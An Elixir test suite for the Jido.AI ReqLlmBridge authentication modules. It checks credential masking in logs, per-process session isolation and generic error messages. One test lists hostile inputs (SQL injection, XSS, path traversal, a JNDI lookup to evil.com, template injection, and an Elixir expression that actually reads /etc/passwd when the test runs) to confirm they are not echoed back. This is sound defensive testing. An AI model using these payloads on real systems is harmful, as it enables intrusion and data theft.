defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
  use ExUnit.Case, async: false
  use Mimic

  @moduletag :capture_log
  @moduletag :security

  import ExUnit.CaptureLog

  alias Jido.AI.Keyring
  alias Jido.AI.ReqLlmBridge.Authentication
  alias Jido.AI.ReqLlmBridge.ProviderAuthRequirements
  alias Jido.AI.ReqLlmBridge.SessionAuthentication

  setup :set_mimic_global

  setup do
    # Start a unique Keyring for testing
    test_keyring_name = :"test_keyring_security_#{:erlang.unique_integer([:positive])}"
    {:ok, _pid} = Keyring.start_link(name: test_keyring_name)

    on_exit(fn ->
      try do
        GenServer.stop(test_keyring_name)
      catch
        :exit, _ -> :ok
      end
    end)

    %{keyring: test_keyring_name}
  end

  describe "credential sanitization in logs and errors" do
    test "API keys sanitized in error messages", %{keyring: _keyring} do
      # Test various API key formats that should be sanitized
      sensitive_keys = [
        "sk-proj-abcdefghijklmnopqrstuvwxyz123456789",
        "sk-ant-api03-very-long-anthropic-key-format",
        "AIzaSyD-google-api-key-format",
        "cf-very-long-cloudflare-key",
        "sk-or-v1-openrouter-key-format"
      ]

      for sensitive_key <- sensitive_keys do
        # Clear session to force error
        SessionAuthentication.clear_for_provider(:openai)

        # Mock external systems to fail and return error with potential key exposure
        expect(ReqLlmBridge.Keys, :get, fn :openai, %{} ->
          {:error, "API key #{sensitive_key} is invalid"}
        end)

        stub(Keyring, :get_env_value, fn :default, :openai_api_key, nil ->
          nil
        end)

        # Capture any logs that might contain the key
        log_output =
          capture_log(fn ->
            {:error, error_message} = Authentication.authenticate_for_provider(:openai, %{})

            # Error message should not contain the full sensitive key
            assert not String.contains?(error_message, sensitive_key),
                   "Sensitive key exposed in error message: #{error_message}"

            # Error message should not contain key fragments longer than 8 chars
            key_fragments = String.split(sensitive_key, "-")

            for fragment <- key_fragments do
              if String.length(fragment) > 8 do
                assert not String.contains?(error_message, fragment),
                       "Key fragment exposed in error: #{fragment}"
              end
            end
          end)

        # Log output should not contain sensitive keys
        assert not String.contains?(log_output, sensitive_key),
               "Sensitive key exposed in logs: #{log_output}"
      end
    end

    test "authentication headers safely formatted", %{keyring: _keyring} do
      sensitive_keys = [
        "sk-proj-test-key-should-be-masked",
        "sk-ant-another-sensitive-key",
        "very-long-google-api-key-format"
      ]

      for sensitive_key <- sensitive_keys do
        SessionAuthentication.set_for_provider(:openai, sensitive_key)

        # Get headers - should not leak in any inspection/debug output
        {:ok, headers, key} = Authentication.authenticate_for_provider(:openai, %{})

        # Verify the key is returned correctly (for functionality)
        assert key == sensitive_key

        # Verify headers are properly formatted
        assert headers["authorization"] == "Bearer #{sensitive_key}"

        # But debug/inspect of the result should not expose keys in logs
        log_output =
          capture_log(fn ->
            # Simulate potential debug logging
            require Logger
            Logger.debug("Authentication result: #{inspect({:ok, headers, key})}")
          end)

        # This test verifies our logging doesn't expose keys
        # (In production, such debug logging should be avoided entirely)
        if String.contains?(log_output, sensitive_key) do
          flunk("Sensitive key exposed in debug logs - review logging practices")
        end
      end
    end

    test "provider requirements don't expose keys in validation errors", %{keyring: _keyring} do
      # Test various invalid keys that might be returned in error messages
      invalid_keys = [
        "sk-invalid-but-potentially-real-key",
        "sk-ant-fake-but-sensitive-looking",
        "AIzaSyD-could-be-real-google-key",
        # Empty key test
        ""
      ]

      providers = [:openai, :anthropic, :google, :cloudflare, :openrouter]

      for provider <- providers do
        for invalid_key <- invalid_keys do
          result = ProviderAuthRequirements.validate_auth(provider, invalid_key)

          case result do
            {:error, error_message} ->
              # Error messages should not echo back potentially sensitive data
              if String.length(invalid_key) > 10 do
                assert not String.contains?(error_message, invalid_key),
                       "Potentially sensitive key exposed in validation error: #{error_message}"
              end

              # Generic error messages are preferred for security
              assert String.contains?(error_message, "API key") or
                       String.contains?(error_message, "Invalid") or
                       String.contains?(error_message, "format"),
                     "Error message should be generic: #{error_message}"

            :ok ->
              # Some invalid keys might pass format checks - that's ok for this test
              :ok
          end
        end
      end
    end

    test "session isolation prevents credential cross-contamination", %{keyring: _keyring} do
      # Set up sensitive keys in main process
      main_sensitive_key = "sk-main-process-secret-key"
      SessionAuthentication.set_for_provider(:openai, main_sensitive_key)

      _main_pid = self()

      # Test that child processes cannot access parent's sensitive data
      child_task =
        Task.async(fn ->
          # Child should not see parent's authentication without explicit inheritance
          case SessionAuthentication.get_for_request(:openai, %{}) do
            {:session_auth, options} ->
              # If somehow accessible, ensure it's not the sensitive key
              child_key = options[:api_key]
              {:contamination_detected, child_key}

            {:no_session_auth} ->
              :properly_isolated
          end
        end)

      child_result = Task.await(child_task)

      case child_result do
        :properly_isolated ->
          # Expected behavior
          :ok

        {:contamination_detected, leaked_key} ->
          flunk("Session isolation failed: child process accessed parent's key: #{leaked_key}")
      end

      # Verify main process still has its authentication
      {:session_auth, options} = SessionAuthentication.get_for_request(:openai, %{})
      assert options[:api_key] == main_sensitive_key
    end

    test "credential masking in authentication resolution logging", %{keyring: _keyring} do
      # Enable debug logging for this test
      original_debug_setting = Application.get_env(:jido_ai, :debug_auth_resolution, false)
      Application.put_env(:jido_ai, :debug_auth_resolution, true)

      on_exit(fn ->
        Application.put_env(:jido_ai, :debug_auth_resolution, original_debug_setting)
      end)

      sensitive_key = "sk-very-sensitive-key-that-should-be-masked"
      SessionAuthentication.set_for_provider(:openai, sensitive_key)

      # Capture debug logs during authentication
      log_output =
        capture_log(fn ->
          {:ok, _headers, _key} = Authentication.authenticate_for_provider(:openai, %{})
        end)

      # Debug logs should mask the key
      assert not String.contains?(log_output, sensitive_key),
             "Unmasked key in debug logs: #{log_output}"

      # Should contain masked version if any logging occurred
      if String.contains?(log_output, "authentication") do
        # Look for masking patterns like "sk-v***-key" or similar
        masked_patterns = ["***", "****", "..."]
        has_masking = Enum.any?(masked_patterns, &String.contains?(log_output, &1))

        if not has_masking do
          # If no masking pattern found, ensure no sensitive data is present
          key_start = String.slice(sensitive_key, 0, 8)
          key_end = String.slice(sensitive_key, -8, 8)

          assert not (String.contains?(log_output, key_start) and
                        String.contains?(log_output, key_end)),
                 "Potential key leakage in logs without proper masking: #{log_output}"
        end
      end
    end
  end

  describe "secure error handling" do
    test "authentication failures don't leak system information", %{keyring: _keyring} do
      # Clear authentication
      SessionAuthentication.clear_for_provider(:openai)

      # Mock various system failures
      system_error_scenarios = [
        fn ->
          expect(ReqLlmBridge.Keys, :get, fn :openai, %{} ->
            raise "Internal system error with sensitive path /home/user/.env"
          end)
        end,
        fn ->
          expect(ReqLlmBridge.Keys, :get, fn :openai, %{} ->
            {:error, "Connection failed to internal-auth-server.company.com:8080"}
          end)
        end,
        fn ->
          expect(ReqLlmBridge.Keys, :get, fn :openai, %{} ->
            {:error, "Database connection failed: postgresql://user:pass@db.internal:5432/auth"}
          end)
        end
      ]

      stub(Keyring, :get_env_value, fn :default, :openai_api_key, nil ->
        nil
      end)

      for setup_error <- system_error_scenarios do
        setup_error.()

        # Capture any error information
        result = Authentication.authenticate_for_provider(:openai, %{})

        case result do
          {:error, error_message} ->
            # Error messages should not contain internal system information
            sensitive_patterns = [
              "/home/",
              "localhost",
              ".internal",
              "password",
              "pass@",
              "user:",
              "postgresql://",
              "Internal system error"
            ]

            for pattern <- sensitive_patterns do
              assert not String.contains?(
                       String.downcase(error_message),
                       String.downcase(pattern)
                     ),
                     "System information leaked in error: #{error_message}"
            end

            # Error should be generic
            assert String.contains?(error_message, "API key not found"),
                   "Error should be user-friendly: #{error_message}"

          other ->
            flunk("Unexpected result from authentication: #{inspect(other)}")
        end
      end
    end

    test "provider validation errors are safe", %{keyring: _keyring} do
      # Test that validation errors don't expose internal implementation details
      malicious_inputs = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "%00admin%00",
        "{{7*7}}",
        # Elixir injection attempt
        "#{File.read!(~c'/etc/passwd')}"
      ]

      providers = [:openai, :anthropic, :google]

      for provider <- providers do
        for malicious_input <- malicious_inputs do
          {:error, error_message} =
            ProviderAuthRequirements.validate_auth(provider, malicious_input)

          # Error messages should be sanitized and generic
          assert not String.contains?(error_message, malicious_input),
                 "Malicious input echoed in error: #{error_message}"

          # Should not contain system paths or sensitive info
          dangerous_patterns = ["/etc/", "/home/", "root:", "admin", "password"]

          for pattern <- dangerous_patterns do
            assert not String.contains?(String.downcase(error_message), pattern),
                   "Dangerous pattern in error message: #{error_message}"
          end

          # Error should be generic validation message
          assert String.contains?(error_message, "Invalid") or
                   String.contains?(error_message, "API key") or
                   String.contains?(error_message, "format"),
                 "Error should be generic validation message: #{error_message}"
        end
      end
    end
  end

  describe "secure session management" do
    test "session values are properly isolated per process", %{keyring: _keyring} do
      # Create multiple concurrent processes with different sensitive data
      num_processes = 5
      base_key = "sk-isolation-test"

      isolation_tasks =
        for process_id <- 1..num_processes do
          Task.async(fn ->
            # Each process has its own sensitive key
            my_sensitive_key = "#{base_key}-process-#{process_id}"
            SessionAuthentication.set_for_provider(:openai, my_sensitive_key)

            # Wait for other processes to set their keys
            :timer.sleep(50)

            # Verify I only see my own key
            {:session_auth, options} = SessionAuthentication.get_for_request(:openai, %{})
            retrieved_key = options[:api_key]

            # Should be my key
            assert retrieved_key == my_sensitive_key,
                   "Process #{process_id} got wrong key: #{retrieved_key}"

            # Should not be any other process's key
            for other_id <- 1..num_processes do
              if other_id != process_id do
                other_key = "#{base_key}-process-#{other_id}"

                assert retrieved_key != other_key,
                       "Process #{process_id} got process #{other_id}'s key: #{retrieved_key}"
              end
            end

            {process_id, retrieved_key}
          end)
        end

      # Wait for all processes and verify results
      results = Task.await_many(isolation_tasks, 5_000)

      # Each process should have gotten its own unique key
      keys = Enum.map(results, fn {_id, key} -> key end)
      unique_keys = Enum.uniq(keys)

      assert length(keys) == length(unique_keys),
             "Process isolation failed - duplicate keys found: #{inspect(keys)}"

      # Verify each key matches expected pattern
      for {process_id, key} <- results do
        expected_key = "#{base_key}-process-#{process_id}"

        assert key == expected_key,
               "Process #{process_id} key mismatch: got #{key}, expected #{expected_key}"
      end
    end

    test "session cleanup prevents data persistence", %{keyring: _keyring} do
      sensitive_keys = [
        "sk-should-not-persist-after-cleanup",
        "sk-ant-cleanup-test-key",
        "sensitive-google-key-cleanup"
      ]

      providers = [:openai, :anthropic, :google]

      # Set sensitive keys
      for {provider, key} <- Enum.zip(providers, sensitive_keys) do
        SessionAuthentication.set_for_provider(provider, key)
      end

      # Verify keys are set
      for {provider, expected_key} <- Enum.zip(providers, sensitive_keys) do
        {:session_auth, options} = SessionAuthentication.get_for_request(provider, %{})
        assert options[:api_key] == expected_key
      end

      # Clear all authentication
      SessionAuthentication.clear_all()

      # Verify complete cleanup
      for provider <- providers do
        result = SessionAuthentication.get_for_request(provider, %{})

        assert result == {:no_session_auth},
               "Session data persisted after cleanup for #{provider}: #{inspect(result)}"
      end

      # Verify no providers are listed as having authentication
      remaining_providers = SessionAuthentication.list_providers_with_auth()

      assert remaining_providers == [],
             "Providers still listed after cleanup: #{inspect(remaining_providers)}"

      # Double-check by attempting authentication
      # (should fail and fall back to external sources)
      expect(ReqLlmBridge.Keys, :get, length(providers), fn _provider, %{} ->
        {:error, "No external auth available"}
      end)

      stub(Keyring, :get_env_value, fn :default, _key, nil ->
        nil
      end)

      for provider <- providers do
        {:error, _reason} = Authentication.authenticate_for_provider(provider, %{})
      end
    end

    test "concurrent session modifications are safe", %{keyring: _keyring} do
      # Test concurrent modifications to prevent race conditions that could leak data
      provider = :openai
      num_concurrent_operations = 20

      concurrent_tasks =
        for operation_id <- 1..num_concurrent_operations do
          Task.async(fn ->
            operation_key = "sk-concurrent-#{operation_id}"

            # Perform rapid set/get/clear operations
            SessionAuthentication.set_for_provider(provider, operation_key)

            # Brief random delay to increase chance of race conditions
            :timer.sleep(:rand.uniform(10))

            # Try to retrieve (might get this key or another concurrent one)
            result = SessionAuthentication.get_for_request(provider, %{})

            # Clear this operation's key
            SessionAuthentication.clear_for_provider(provider)

            case result do
              {:session_auth, options} ->
                retrieved_key = options[:api_key]
                # Should be some valid concurrent operation key
                assert String.starts_with?(retrieved_key, "sk-concurrent-"),
                       "Invalid key format in concurrent operation: #{retrieved_key}"

                {operation_id, :got_key, retrieved_key}

              {:no_session_auth} ->
                {operation_id, :no_key, nil}
            end
          end)
        end

      # Wait for all concurrent operations
      concurrent_results = Task.await_many(concurrent_tasks, 10_000)

      # Analyze results for safety
      keys_retrieved = for {_id, :got_key, key} <- concurrent_results, do: key
      unique_keys = Enum.uniq(keys_retrieved)

      # All retrieved keys should be valid concurrent operation keys
      for key <- unique_keys do
        assert String.starts_with?(key, "sk-concurrent-"),
               "Invalid key retrieved during concurrent operations: #{key}"
      end

      # Final state should be clean (all operations cleared their keys)
      final_result = SessionAuthentication.get_for_request(provider, %{})

      assert final_result == {:no_session_auth},
             "Session not properly cleaned after concurrent operations: #{inspect(final_result)}"
    end
  end
end
